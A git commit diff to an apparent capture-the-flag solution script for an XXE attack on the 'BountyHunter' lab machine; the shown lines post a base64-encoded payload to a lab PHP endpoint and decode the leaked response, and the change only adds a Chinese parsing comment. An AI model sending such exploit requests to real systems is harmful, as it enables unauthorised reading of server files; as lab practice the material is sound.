23b32850ef7d8d512d495069b33a428bed91ac46
LIANG-TSO <62923957+a6232283@users.noreply.github.com>
2024-05-21 18:54:48 +0800

    Update BountyHunter-xee_attack.py

--- code/BountyHunter-xee_attack.py
+++ code/BountyHunter-xee_attack.py
@@ -21,6 +21,6 @@ payload_b64=base64.b64encode(payload).decode()
 data={"data":payload_b64}
 r=requests.post("http://10.10.11.100/tracker_diRbPr00f314.php",data=data)
 #print (r)
-output=r.text.split('>')[5][:-4]
+output=r.text.split('>')[5][:-4]#進行抓取第五行及倒數第四行。也就是只要第六行
 #print (output)
 print (base64.b64decode(output).decode())
